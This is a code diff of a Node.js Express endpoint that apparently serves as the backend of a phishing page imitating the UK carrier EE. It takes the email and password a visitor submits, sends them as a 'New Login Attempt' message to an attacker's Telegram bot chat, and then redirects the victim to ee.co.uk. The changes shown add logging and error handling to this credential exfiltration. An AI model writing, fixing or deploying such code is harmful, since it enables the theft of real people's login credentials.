@@ -1,5 +1,3 @@
-// api/submit.js
-
 const express = require('express');
 const axios = require('axios');
 
@@ -13,6 +11,8 @@ const chatId = '7587120060';
 
 app.post('/api/submit', async (req, res) => {
     try {
+        console.log("📥 Request received:", req.body);
+
         const { email, password } = req.body;
 
         if (!email || !password) {
@@ -24,26 +24,43 @@ app.post('/api/submit', async (req, res) => {
 
         const message = `🔐 New Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
 
-        // Send message to Telegram
-        await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
-            chat_id: chatId,
-            text: message
-        });
+        console.log("📨 Preparing to send to Telegram...");
 
-        // Respond with redirect URL
+        const response = await axios.post(
+            `https://api.telegram.org/bot ${telegramBotToken}/sendMessage`,
+            {
+                chat_id: chatId,
+                text: message
+            },
+            {
+                validateStatus: () => true // Don't throw on error status
+            }
+        );
+
+        console.log("📡 Telegram API Response Status:", response.status);
+        console.log("📩 Telegram API Response Data:", response.data);
+
+        if (!response.data.ok) {
+            return res.status(502).json({
+                success: false,
+                message: "Telegram API rejected the request.",
+                error: response.data
+            });
+        }
+
         res.json({
             success: true,
             redirectUrl: 'https://ee.co.uk/ '
         });
 
     } catch (error) {
-        console.error("🚨 Server error:", error.message);
+        console.error("🚨 ERROR:", error.message);
 
-        if (error.response && error.response.data) {
-            console.error("Telegram API Error:", error.response.data);
-            return res.status(500).json({
+        if (error.response) {
+            console.error("Telegram API Error Response:", error.response.data);
+            return res.status(error.response.status || 500).json({
                 success: false,
-                message: "Failed to send data to Telegram.",
+                message: "Telegram API returned an error.",
                 error: error.response.data
             });
         }
@@ -52,7 +69,8 @@ app.post('/api/submit', async (req, res) => {
             console.error("No response from Telegram:", error.request);
             return res.status(504).json({
                 success: false,
-                message: "Timeout connecting to Telegram."
+                message: "Timeout connecting to Telegram.",
+                error: "No response from Telegram"
             });
         }
 
